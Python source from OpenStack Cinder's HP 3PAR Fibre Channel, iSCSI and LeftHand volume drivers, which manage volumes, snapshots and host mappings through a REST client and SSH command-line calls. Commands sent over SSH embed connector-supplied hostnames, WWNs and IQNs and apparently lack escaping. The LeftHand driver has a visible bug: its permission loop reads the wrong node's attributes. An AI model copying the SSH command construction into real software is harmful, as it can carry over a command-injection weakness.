        LOG.debug(""Issuing remove command to find vvset name %s"" % cmd)
        out = self._cli_run(cmd)
        vvset_name = None
        if out and len(out) > 1:
            if out[1].startswith(""Attempt to delete ""):
                words = out[1].split("" "")
                vvset_name = words[len(words) - 1]

        return vvset_name

    def delete_volume(self, volume):
        try:
            volume_name = self._get_3par_vol_name(volume['id'])
            # Try and delete the volume, it might fail here because
            # the volume is part of a volume set which will have the
            # volume set name in the error.
            try:
                self.client.deleteVolume(volume_name)
            except hpexceptions.HTTPConflict as ex:
                if ex.get_code() == 34:
                    # This is a special case which means the
                    # volume is part of a volume set.
                    vvset_name = self._get_vvset_from_3par(volume_name)
                    LOG.debug(""Returned vvset_name = %s"" % vvset_name)
                    if vvset_name is not None and \
                       vvset_name.startswith('vvs-'):
                        # We have a single volume per volume set, so
                        # remove the volume set.
                        self._remove_volume_set(
                            self._get_3par_vvs_name(volume['id']))
                    elif vvset_name is not None:
                        # We have a pre-defined volume set just remove the
                        # volume and leave the volume set.
                        self._remove_volume_from_volume_set(volume_name,
                                                            vvset_name)
                    self.client.deleteVolume(volume_name)
                else:
                    raise ex

        except hpexceptions.HTTPNotFound as ex:
            # We'll let this act as if it worked
            # it helps clean up the cinder entries.
            LOG.error(str(ex))
        except hpexceptions.HTTPForbidden as ex:
            LOG.error(str(ex))
            raise exception.NotAuthorized(ex.get_description())
        except Exception as ex:
            LOG.error(str(ex))
            raise exception.CinderException(ex)

    def create_volume_from_snapshot(self, volume, snapshot):
        """"""Creates a volume from a snapshot.

        TODO: support using the size from the user.
        """"""
        LOG.debug(""Create Volume from Snapshot\n%s\n%s"" %
                  (pprint.pformat(volume['display_name']),
                   pprint.pformat(snapshot['display_name'])))

        if snapshot['volume_size'] != volume['size']:
            err = ""You cannot change size of the volume.  It must ""
            ""be the same as the snapshot.""
            LOG.error(err)
            raise exception.InvalidInput(reason=err)

        try:
            snap_name = self._get_3par_snap_name(snapshot['id'])
            volume_name = self._get_3par_vol_name(volume['id'])

            extra = {'volume_id': volume['id'],
                     'snapshot_id': snapshot['id']}

            volume_type = None
            type_id = volume.get('volume_type_id', None)
            vvs_name = None
            qos = {}
            hp3par_keys = {}
            if type_id is not None:
                volume_type = self._get_volume_type(type_id)
                hp3par_keys = self._get_keys_by_volume_type(volume_type)
                vvs_name = self._get_key_value(hp3par_keys, 'vvs')
                if vvs_name is None:
                    qos = self._get_qos_by_volume_type(volume_type)

            name = volume.get('display_name', None)
            if name:
                extra['display_name'] = name

            description = volume.get('display_description', None)
            if description:
                extra['description'] = description

            optional = {'comment': json.dumps(extra),
                        'readOnly': False}

            self.client.createSnapshot(volume_name, snap_name, optional)
            if qos or vvs_name is not None:
                cpg = self._get_key_value(hp3par_keys, 'cpg',
                                          self.config.hp3par_cpg)
                try:
                    self._add_volume_to_volume_set(volume, volume_name,
                                                   cpg, vvs_name, qos)
                except Exception as ex:
                    # Delete the volume if unable to add it to the volume set
                    self.client.deleteVolume(volume_name)
                    LOG.error(str(ex))
                    raise exception.CinderException(ex.get_description())
        except hpexceptions.HTTPForbidden:
            raise exception.NotAuthorized()
        except hpexceptions.HTTPNotFound:
            raise exception.NotFound()
        except Exception as ex:
            LOG.error(str(ex))
            raise exception.CinderException(ex.get_description())

    def create_snapshot(self, snapshot):
        LOG.debug(""Create Snapshot\n%s"" % pprint.pformat(snapshot))

        try:
            snap_name = self._get_3par_snap_name(snapshot['id'])
            vol_name = self._get_3par_vol_name(snapshot['volume_id'])

            extra = {'volume_name': snapshot['volume_name']}
            vol_id = snapshot.get('volume_id', None)
            if vol_id:
                extra['volume_id'] = vol_id

            try:
                extra['display_name'] = snapshot['display_name']
            except AttributeError:
                pass

            try:
                extra['description'] = snapshot['display_description']
            except AttributeError:
                pass

            optional = {'comment': json.dumps(extra),
                        'readOnly': True}
            if self.config.hp3par_snapshot_expiration:
                optional['expirationHours'] = (
                    self.config.hp3par_snapshot_expiration)

            if self.config.hp3par_snapshot_retention:
                optional['retentionHours'] = (
                    self.config.hp3par_snapshot_retention)

            self.client.createSnapshot(snap_name, vol_name, optional)
        except hpexceptions.HTTPForbidden:
            raise exception.NotAuthorized()
        except hpexceptions.HTTPNotFound:
            raise exception.NotFound()

    def delete_snapshot(self, snapshot):
        LOG.debug(""Delete Snapshot\n%s"" % pprint.pformat(snapshot))

        try:
            snap_name = self._get_3par_snap_name(snapshot['id'])
            self.client.deleteVolume(snap_name)
        except hpexceptions.HTTPForbidden:
            raise exception.NotAuthorized()
        except hpexceptions.HTTPNotFound as ex:
            LOG.error(str(ex))

    def _get_3par_hostname_from_wwn_iqn(self, wwns_iqn):
        out = self._cli_run(['showhost', '-d'])
        # wwns_iqn may be a list of strings or a single
        # string. So, if necessary, create a list to loop.
        if not isinstance(wwns_iqn, list):
            wwn_iqn_list = [wwns_iqn]
        else:
            wwn_iqn_list = wwns_iqn

        for wwn_iqn in wwn_iqn_list:
            for showhost in out:
                if (wwn_iqn.upper() in showhost.upper()):
                    return showhost.split(',')[1]

    def terminate_connection(self, volume, hostname, wwn_iqn):
        """"""Driver entry point to unattach a volume from an instance.""""""
        try:
            # does 3par know this host by a different name?
            if hostname in self.hosts_naming_dict:
                hostname = self.hosts_naming_dict.get(hostname)
            self.delete_vlun(volume, hostname)
            return
        except hpexceptions.HTTPNotFound as e:
            if 'host does not exist' in e.get_description():
                # use the wwn to see if we can find the hostname
                hostname = self._get_3par_hostname_from_wwn_iqn(wwn_iqn)
                # no 3par host, re-throw
                if (hostname is None):
                    raise
            else:
            # not a 'host does not exist' HTTPNotFound exception, re-throw
                raise

        #try again with name retrieved from 3par
        self.delete_vlun(volume, hostname)

    def parse_create_host_error(self, hostname, out):
        search_str = ""already used by host ""
        if search_str in out[1]:
            #host exists, return name used by 3par
            hostname_3par = self.get_next_word(out[1], search_str)
            self.hosts_naming_dict[hostname] = hostname_3par
            return hostname_3par
/n/n/ncinder/volume/drivers/san/hp/hp_3par_fc.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
""""""
Volume driver for HP 3PAR Storage array.
This driver requires 3.1.2 MU2 firmware on the 3PAR array.

You will need to install the python hp3parclient.
sudo pip install hp3parclient

Set the following in the cinder.conf file to enable the
3PAR Fibre Channel Driver along with the required flags:

volume_driver=cinder.volume.drivers.san.hp.hp_3par_fc.HP3PARFCDriver
""""""

from hp3parclient import exceptions as hpexceptions
from oslo.config import cfg

from cinder import exception
from cinder.openstack.common import log as logging
from cinder import utils
import cinder.volume.driver
from cinder.volume.drivers.san.hp import hp_3par_common as hpcommon
from cinder.volume.drivers.san import san

VERSION = 1.1
LOG = logging.getLogger(__name__)


class HP3PARFCDriver(cinder.volume.driver.FibreChannelDriver):
    """"""OpenStack Fibre Channel driver to enable 3PAR storage array.

    Version history:
        1.0 - Initial driver
        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,
              session changes, faster clone, requires 3.1.2 MU2 firmware,
              copy volume <--> Image.
    """"""

    def __init__(self, *args, **kwargs):
        super(HP3PARFCDriver, self).__init__(*args, **kwargs)
        self.common = None
        self.configuration.append_config_values(hpcommon.hp3par_opts)
        self.configuration.append_config_values(san.san_opts)

    def _init_common(self):
        return hpcommon.HP3PARCommon(self.configuration)

    def _check_flags(self):
        """"""Sanity check to ensure we have required options set.""""""
        required_flags = ['hp3par_api_url', 'hp3par_username',
                          'hp3par_password',
                          'san_ip', 'san_login', 'san_password']
        self.common.check_flags(self.configuration, required_flags)

    @utils.synchronized('3par', external=True)
    def get_volume_stats(self, refresh):
        self.common.client_login()
        stats = self.common.get_volume_stats(refresh)
        stats['storage_protocol'] = 'FC'
        backend_name = self.configuration.safe_get('volume_backend_name')
        stats['volume_backend_name'] = backend_name or self.__class__.__name__
        self.common.client_logout()
        return stats

    def do_setup(self, context):
        self.common = self._init_common()
        self._check_flags()
        self.common.do_setup(context)

    def check_for_setup_error(self):
        """"""Returns an error if prerequisites aren't met.""""""
        self._check_flags()

    @utils.synchronized('3par', external=True)
    def create_volume(self, volume):
        self.common.client_login()
        metadata = self.common.create_volume(volume)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_cloned_volume(self, volume, src_vref):
        self.common.client_login()
        new_vol = self.common.create_cloned_volume(volume, src_vref)
        self.common.client_logout()
        return {'metadata': new_vol}

    @utils.synchronized('3par', external=True)
    def delete_volume(self, volume):
        self.common.client_login()
        self.common.delete_volume(volume)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def create_volume_from_snapshot(self, volume, snapshot):
        """"""
        Creates a volume from a snapshot.

        TODO: support using the size from the user.
        """"""
        self.common.client_login()
        metadata = self.common.create_volume_from_snapshot(volume, snapshot)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_snapshot(self, snapshot):
        self.common.client_login()
        self.common.create_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def delete_snapshot(self, snapshot):
        self.common.client_login()
        self.common.delete_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def initialize_connection(self, volume, connector):
        """"""Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host.

        The  driver returns a driver_volume_type of 'fibre_channel'.
        The target_wwn can be a single entry or a list of wwns that
        correspond to the list of remote wwn(s) that will export the volume.
        Example return values:

            {
                'driver_volume_type': 'fibre_channel'
                'data': {
                    'target_discovered': True,
                    'target_lun': 1,
                    'target_wwn': '1234567890123',
                }
            }

            or

             {
                'driver_volume_type': 'fibre_channel'
                'data': {
                    'target_discovered': True,
                    'target_lun': 1,
                    'target_wwn': ['1234567890123', '0987654321321'],
                }
            }


        Steps to export a volume on 3PAR
          * Create a host on the 3par with the target wwn
          * Create a VLUN for that HOST with the volume we want to export.

        """"""
        self.common.client_login()
        # we have to make sure we have a host
        host = self._create_host(volume, connector)

        # now that we have a host, create the VLUN
        vlun = self.common.create_vlun(volume, host)

        ports = self.common.get_ports()

        self.common.client_logout()
        info = {'driver_volume_type': 'fibre_channel',
                'data': {'target_lun': vlun['lun'],
                         'target_discovered': True,
                         'target_wwn': ports['FC']}}
        return info

    @utils.synchronized('3par', external=True)
    def terminate_connection(self, volume, connector, **kwargs):
        """"""Driver entry point to unattach a volume from an instance.""""""
        self.common.client_login()
        self.common.terminate_connection(volume,
                                         connector['host'],
                                         connector['wwpns'])
        self.common.client_logout()

    def _create_3par_fibrechan_host(self, hostname, wwns, domain, persona_id):
        """"""Create a 3PAR host.

        Create a 3PAR host, if there is already a host on the 3par using
        the same wwn but with a different hostname, return the hostname
        used by 3PAR.
        """"""
        command = ['createhost', '-persona', persona_id, '-domain', domain,
                   hostname]
        for wwn in wwns:
            command.append(wwn)

        out = self.common._cli_run(command)
        if out and len(out) > 1:
            return self.common.parse_create_host_error(hostname, out)

        return hostname

    def _modify_3par_fibrechan_host(self, hostname, wwns):
        # when using -add, you can not send the persona or domain options
        command = ['createhost', '-add', hostname]
        for wwn in wwns:
            command.append(wwn)

        out = self.common._cli_run(command)

    def _create_host(self, volume, connector):
        """"""Creates or modifies existing 3PAR host.""""""
        host = None
        hostname = self.common._safe_hostname(connector['host'])
        cpg = self.common.get_cpg(volume, allowSnap=True)
        domain = self.common.get_domain(cpg)
        try:
            host = self.common._get_3par_host(hostname)
            if not host['FCPaths']:
                self._modify_3par_fibrechan_host(hostname, connector['wwpns'])
                host = self.common._get_3par_host(hostname)
        except hpexceptions.HTTPNotFound as ex:
            # get persona from the volume type extra specs
            persona_id = self.common.get_persona_type(volume)
            # host doesn't exist, we have to create it
            hostname = self._create_3par_fibrechan_host(hostname,
                                                        connector['wwpns'],
                                                        domain,
                                                        persona_id)
            host = self.common._get_3par_host(hostname)

        return host

    @utils.synchronized('3par', external=True)
    def create_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def ensure_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def remove_export(self, context, volume):
        pass

    def extend_volume(self, volume, new_size):
        self.common.extend_volume(volume, new_size)
/n/n/ncinder/volume/drivers/san/hp/hp_3par_iscsi.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2012-2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
""""""
Volume driver for HP 3PAR Storage array.
This driver requires 3.1.2 MU2 firmware on the 3PAR array.

You will need to install the python hp3parclient.
sudo pip install hp3parclient

Set the following in the cinder.conf file to enable the
3PAR iSCSI Driver along with the required flags:

volume_driver=cinder.volume.drivers.san.hp.hp_3par_iscsi.HP3PARISCSIDriver
""""""

import sys

from hp3parclient import exceptions as hpexceptions

from cinder import exception
from cinder.openstack.common import log as logging
from cinder import utils
import cinder.volume.driver
from cinder.volume.drivers.san.hp import hp_3par_common as hpcommon
from cinder.volume.drivers.san import san

VERSION = 1.1
LOG = logging.getLogger(__name__)
DEFAULT_ISCSI_PORT = 3260


class HP3PARISCSIDriver(cinder.volume.driver.ISCSIDriver):
    """"""OpenStack iSCSI driver to enable 3PAR storage array.

    Version history:
        1.0 - Initial driver
        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,
              session changes, faster clone, requires 3.1.2 MU2 firmware.

    """"""
    def __init__(self, *args, **kwargs):
        super(HP3PARISCSIDriver, self).__init__(*args, **kwargs)
        self.common = None
        self.configuration.append_config_values(hpcommon.hp3par_opts)
        self.configuration.append_config_values(san.san_opts)

    def _init_common(self):
        return hpcommon.HP3PARCommon(self.configuration)

    def _check_flags(self):
        """"""Sanity check to ensure we have required options set.""""""
        required_flags = ['hp3par_api_url', 'hp3par_username',
                          'hp3par_password', 'san_ip', 'san_login',
                          'san_password']
        self.common.check_flags(self.configuration, required_flags)

    @utils.synchronized('3par', external=True)
    def get_volume_stats(self, refresh):
        self.common.client_login()
        stats = self.common.get_volume_stats(refresh)
        stats['storage_protocol'] = 'iSCSI'
        backend_name = self.configuration.safe_get('volume_backend_name')
        stats['volume_backend_name'] = backend_name or self.__class__.__name__
        self.common.client_logout()
        return stats

    def do_setup(self, context):
        self.common = self._init_common()
        self._check_flags()

        # map iscsi_ip-> ip_port
        #             -> iqn
        #             -> nsp
        self.iscsi_ips = {}
        temp_iscsi_ip = {}

        # use the 3PAR ip_addr list for iSCSI configuration
        if len(self.configuration.hp3par_iscsi_ips) > 0:
            # add port values to ip_addr, if necessary
            for ip_addr in self.configuration.hp3par_iscsi_ips:
                ip = ip_addr.split(':')
                if len(ip) == 1:
                    temp_iscsi_ip[ip_addr] = {'ip_port': DEFAULT_ISCSI_PORT}
                elif len(ip) == 2:
                    temp_iscsi_ip[ip[0]] = {'ip_port': ip[1]}
                else:
                    msg = _(""Invalid IP address format '%s'"") % ip_addr
                    LOG.warn(msg)

        # add the single value iscsi_ip_address option to the IP dictionary.
        # This way we can see if it's a valid iSCSI IP. If it's not valid,
        # we won't use it and won't bother to report it, see below
        if (self.configuration.iscsi_ip_address not in temp_iscsi_ip):
            ip = self.configuration.iscsi_ip_address
            ip_port = self.configuration.iscsi_port
            temp_iscsi_ip[ip] = {'ip_port': ip_port}

        # get all the valid iSCSI ports from 3PAR
        # when found, add the valid iSCSI ip, ip port, iqn and nsp
        # to the iSCSI IP dictionary
        # ...this will also make sure ssh works.
        iscsi_ports = self.common.get_ports()['iSCSI']
        for (ip, iscsi_info) in iscsi_ports.iteritems():
            if ip in temp_iscsi_ip:
                ip_port = temp_iscsi_ip[ip]['ip_port']
                self.iscsi_ips[ip] = {'ip_port': ip_port,
                                      'nsp': iscsi_info['nsp'],
                                      'iqn': iscsi_info['iqn']
                                      }
                del temp_iscsi_ip[ip]

        # if the single value iscsi_ip_address option is still in the
        # temp dictionary it's because it defaults to $my_ip which doesn't
        # make sense in this context. So, if present, remove it and move on.
        if (self.configuration.iscsi_ip_address in temp_iscsi_ip):
            del temp_iscsi_ip[self.configuration.iscsi_ip_address]

        # lets see if there are invalid iSCSI IPs left in the temp dict
        if len(temp_iscsi_ip) > 0:
            msg = _(""Found invalid iSCSI IP address(s) in configuration ""
                    ""option(s) hp3par_iscsi_ips or iscsi_ip_address '%s.'"") % \
                   ("", "".join(temp_iscsi_ip))
            LOG.warn(msg)

        if not len(self.iscsi_ips) > 0:
            msg = _('At least one valid iSCSI IP address must be set.')
            raise exception.InvalidInput(reason=(msg))

        self.common.do_setup(context)

    def check_for_setup_error(self):
        """"""Returns an error if prerequisites aren't met.""""""
        self._check_flags()

    @utils.synchronized('3par', external=True)
    def create_volume(self, volume):
        self.common.client_login()
        metadata = self.common.create_volume(volume)
        self.common.client_logout()

        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_cloned_volume(self, volume, src_vref):
        """"""Clone an existing volume.""""""
        self.common.client_login()
        new_vol = self.common.create_cloned_volume(volume, src_vref)
        self.common.client_logout()

        return {'metadata': new_vol}

    @utils.synchronized('3par', external=True)
    def delete_volume(self, volume):
        self.common.client_login()
        self.common.delete_volume(volume)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def create_volume_from_snapshot(self, volume, snapshot):
        """"""
        Creates a volume from a snapshot.

        TODO: support using the size from the user.
        """"""
        self.common.client_login()
        metadata = self.common.create_volume_from_snapshot(volume, snapshot)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_snapshot(self, snapshot):
        self.common.client_login()
        self.common.create_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def delete_snapshot(self, snapshot):
        self.common.client_login()
        self.common.delete_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def initialize_connection(self, volume, connector):
        """"""Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        Steps to export a volume on 3PAR
          * Get the 3PAR iSCSI iqn
          * Create a host on the 3par
          * create vlun on the 3par
        """"""
        self.common.client_login()

        # we have to make sure we have a host
        host = self._create_host(volume, connector)

        # now that we have a host, create the VLUN
        vlun = self.common.create_vlun(volume, host)

        self.common.client_logout()

        iscsi_ip = self._get_iscsi_ip(host['name'])
        iscsi_ip_port = self.iscsi_ips[iscsi_ip]['ip_port']
        iscsi_target_iqn = self.iscsi_ips[iscsi_ip]['iqn']
        info = {'driver_volume_type': 'iscsi',
                'data': {'target_portal': ""%s:%s"" %
                         (iscsi_ip, iscsi_ip_port),
                         'target_iqn': iscsi_target_iqn,
                         'target_lun': vlun['lun'],
                         'target_discovered': True
                         }
                }
        return info

    @utils.synchronized('3par', external=True)
    def terminate_connection(self, volume, connector, **kwargs):
        """"""Driver entry point to unattach a volume from an instance.""""""
        self.common.client_login()
        self.common.terminate_connection(volume,
                                         connector['host'],
                                         connector['initiator'])
        self.common.client_logout()

    def _create_3par_iscsi_host(self, hostname, iscsi_iqn, domain, persona_id):
        """"""Create a 3PAR host.

        Create a 3PAR host, if there is already a host on the 3par using
        the same iqn but with a different hostname, return the hostname
        used by 3PAR.
        """"""
        cmd = ['createhost', '-iscsi', '-persona', persona_id, '-domain',
               domain, hostname, iscsi_iqn]
        out = self.common._cli_run(cmd)
        if out and len(out) > 1:
            return self.common.parse_create_host_error(hostname, out)
        return hostname

    def _modify_3par_iscsi_host(self, hostname, iscsi_iqn):
        # when using -add, you can not send the persona or domain options
        command = ['createhost', '-iscsi', '-add', hostname, iscsi_iqn]
        self.common._cli_run(command)

    def _create_host(self, volume, connector):
        """"""Creates or modifies existing 3PAR host.""""""
        # make sure we don't have the host already
        host = None
        hostname = self.common._safe_hostname(connector['host'])
        cpg = self.common.get_cpg(volume, allowSnap=True)
        domain = self.common.get_domain(cpg)
        try:
            host = self.common._get_3par_host(hostname)
            if not host['iSCSIPaths']:
                self._modify_3par_iscsi_host(hostname, connector['initiator'])
                host = self.common._get_3par_host(hostname)
        except hpexceptions.HTTPNotFound:
            # get persona from the volume type extra specs
            persona_id = self.common.get_persona_type(volume)
            # host doesn't exist, we have to create it
            hostname = self._create_3par_iscsi_host(hostname,
                                                    connector['initiator'],
                                                    domain,
                                                    persona_id)
            host = self.common._get_3par_host(hostname)

        return host

    @utils.synchronized('3par', external=True)
    def create_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def ensure_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def remove_export(self, context, volume):
        pass

    def _get_iscsi_ip(self, hostname):
        """"""Get an iSCSI IP address to use.

        Steps to determine which IP address to use.
          * If only one IP address, return it
          * If there is an active vlun, return the IP associated with it
          * Return IP with fewest active vluns
        """"""
        if len(self.iscsi_ips) == 1:
            return self.iscsi_ips.keys()[0]

        # if we currently have an active port, use it
        nsp = self._get_active_nsp(hostname)

        if nsp is None:
            # no active vlun, find least busy port
            nsp = self._get_least_used_nsp(self._get_iscsi_nsps())
            if nsp is None:
                msg = _(""Least busy iSCSI port not found, ""
                        ""using first iSCSI port in list."")
                LOG.warn(msg)
                return self.iscsi_ips.keys()[0]

        return self._get_ip_using_nsp(nsp)

    def _get_iscsi_nsps(self):
        """"""Return the list of candidate nsps.""""""
        nsps = []
        for value in self.iscsi_ips.values():
            nsps.append(value['nsp'])
        return nsps

    def _get_ip_using_nsp(self, nsp):
        """"""Return IP assiciated with given nsp.""""""
        for (key, value) in self.iscsi_ips.items():
            if value['nsp'] == nsp:
                return key

    def _get_active_nsp(self, hostname):
        """"""Return the active nsp, if one exists, for the given host.""""""
        result = self.common._cli_run(['showvlun', '-a', '-host', hostname])
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                info = line.split("","")
                if info and len(info) > 4:
                    return info[4]

    def _get_least_used_nsp(self, nspss):
        """"""""Return the nsp that has the fewest active vluns.""""""
        # return only the nsp (node:server:port)
        result = self.common._cli_run(['showvlun', '-a', '-showcols', 'Port'])

        # count the number of nsps (there is 1 for each active vlun)
        nsp_counts = {}
        for nsp in nspss:
            # initialize counts to zero
            nsp_counts[nsp] = 0

        current_least_used_nsp = None
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                nsp = line.strip()
                if nsp in nsp_counts:
                    nsp_counts[nsp] = nsp_counts[nsp] + 1

            # identify key (nsp) of least used nsp
            current_smallest_count = sys.maxint
            for (nsp, count) in nsp_counts.iteritems():
                if count < current_smallest_count:
                    current_least_used_nsp = nsp
                    current_smallest_count = count

        return current_least_used_nsp

    def extend_volume(self, volume, new_size):
        self.common.extend_volume(volume, new_size)
/n/n/ncinder/volume/drivers/san/hp_lefthand.py/n/n#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
""""""
HP Lefthand SAN ISCSI Driver.

The driver communicates to the backend aka Cliq via SSH to perform all the
operations on the SAN.
""""""
from lxml import etree

from cinder import exception
from cinder.openstack.common import log as logging
from cinder.volume.drivers.san.san import SanISCSIDriver


LOG = logging.getLogger(__name__)


class HpSanISCSIDriver(SanISCSIDriver):
    """"""Executes commands relating to HP/Lefthand SAN ISCSI volumes.

    We use the CLIQ interface, over SSH.

    Rough overview of CLIQ commands used:

    :createVolume:    (creates the volume)

    :getVolumeInfo:    (to discover the IQN etc)

    :getClusterInfo:    (to discover the iSCSI target IP address)

    :assignVolumeChap:    (exports it with CHAP security)

    The 'trick' here is that the HP SAN enforces security by default, so
    normally a volume mount would need both to configure the SAN in the volume
    layer and do the mount on the compute layer.  Multi-layer operations are
    not catered for at the moment in the cinder architecture, so instead we
    share the volume using CHAP at volume creation time.  Then the mount need
    only use those CHAP credentials, so can take place exclusively in the
    compute layer.
    """"""

    device_stats = {}

    def __init__(self, *args, **kwargs):
        super(HpSanISCSIDriver, self).__init__(*args, **kwargs)
        self.cluster_vip = None

    def _cliq_run(self, verb, cliq_args, check_exit_code=True):
        """"""Runs a CLIQ command over SSH, without doing any result parsing""""""
        cmd_list = [verb]
        for k, v in cliq_args.items():
            cmd_list.append(""%s=%s"" % (k, v))

        return self._run_ssh(cmd_list, check_exit_code)

    def _cliq_run_xml(self, verb, cliq_args, check_cliq_result=True):
        """"""Runs a CLIQ command over SSH, parsing and checking the output""""""
        cliq_args['output'] = 'XML'
        (out, _err) = self._cliq_run(verb, cliq_args, check_cliq_result)

        LOG.debug(_(""CLIQ command returned %s""), out)

        result_xml = etree.fromstring(out)
        if check_cliq_result:
            response_node = result_xml.find(""response"")
            if response_node is None:
                msg = (_(""Malformed response to CLIQ command ""
                         ""%(verb)s %(cliq_args)s. Result=%(out)s"") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

            result_code = response_node.attrib.get(""result"")

            if result_code != ""0"":
                msg = (_(""Error running CLIQ command %(verb)s %(cliq_args)s. ""
                         "" Result=%(out)s"") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

        return result_xml

    def _cliq_get_cluster_info(self, cluster_name):
        """"""Queries for info about the cluster (including IP)""""""
        cliq_args = {}
        cliq_args['clusterName'] = cluster_name
        cliq_args['searchDepth'] = '1'
        cliq_args['verbose'] = '0'

        result_xml = self._cliq_run_xml(""getClusterInfo"", cliq_args)

        return result_xml

    def _cliq_get_cluster_vip(self, cluster_name):
        """"""Gets the IP on which a cluster shares iSCSI volumes""""""
        cluster_xml = self._cliq_get_cluster_info(cluster_name)

        vips = []
        for vip in cluster_xml.findall(""response/cluster/vip""):
            vips.append(vip.attrib.get('ipAddress'))

        if len(vips) == 1:
            return vips[0]

        _xml = etree.tostring(cluster_xml)
        msg = (_(""Unexpected number of virtual ips for cluster ""
                 "" %(cluster_name)s. Result=%(_xml)s"") %
               {'cluster_name': cluster_name, '_xml': _xml})
        raise exception.VolumeBackendAPIException(data=msg)

    def _cliq_get_volume_info(self, volume_name):
        """"""Gets the volume info, including IQN""""""
        cliq_args = {}
        cliq_args['volumeName'] = volume_name
        result_xml = self._cliq_run_xml(""getVolumeInfo"", cliq_args)

        # Result looks like this:
        #<gauche version=""1.0"">
        #  <response description=""Operation succeeded."" name=""CliqSuccess""
        #            processingTime=""87"" result=""0"">
        #    <volume autogrowPages=""4"" availability=""online"" blockSize=""1024""
        #       bytesWritten=""0"" checkSum=""false"" clusterName=""Cluster01""
        #       created=""2011-02-08T19:56:53Z"" deleting=""false"" description=""""
        #       groupName=""Group01"" initialQuota=""536870912"" isPrimary=""true""
        #       iscsiIqn=""iqn.2003-10.com.lefthandnetworks:group01:25366:vol-b""
        #       maxSize=""6865387257856"" md5=""9fa5c8b2cca54b2948a63d833097e1ca""
        #       minReplication=""1"" name=""vol-b"" parity=""0"" replication=""2""
        #       reserveQuota=""536870912"" scratchQuota=""4194304""
        #       serialNumber=""9fa5c8b2cca54b2948a63d833097e1ca0000000000006316""
        #       size=""1073741824"" stridePages=""32"" thinProvision=""true"">
        #      <status description=""OK"" value=""2""/>
        #      <permission access=""rw""
        #            authGroup=""api-34281B815713B78-(trimmed)51ADD4B7030853AA7""
        #            chapName=""chapusername"" chapRequired=""true"" id=""25369""
        #            initiatorSecret="""" iqn="""" iscsiEnabled=""true""
        #            loadBalance=""true"" targetSecret=""supersecret""/>
        #    </volume>
        #  </response>
        #</gauche>

        # Flatten the nodes into a dictionary; use prefixes to avoid collisions
        volume_attributes = {}

        volume_node = result_xml.find(""response/volume"")
        for k, v in volume_node.attrib.items():
            volume_attributes[""volume."" + k] = v

        status_node = volume_node.find(""status"")
        if status_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes[""status."" + k] = v

        # We only consider the first permission node
        permission_node = volume_node.find(""permission"")
        if permission_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes[""permission."" + k] = v

        LOG.debug(_(""Volume info: %(volume_name)s => %(volume_attributes)s"") %
                  {'volume_name': volume_name,
                   'volume_attributes': volume_attributes})
        return volume_attributes

    def create_volume(self, volume):
        """"""Creates a volume.""""""
        cliq_args = {}
        cliq_args['clusterName'] = self.configuration.san_clustername

        if self.configuration.san_thin_provision:
            cliq_args['thinProvision'] = '1'
        else:
            cliq_args['thinProvision'] = '0'

        cliq_args['volumeName'] = volume['name']
        if int(volume['size']) == 0:
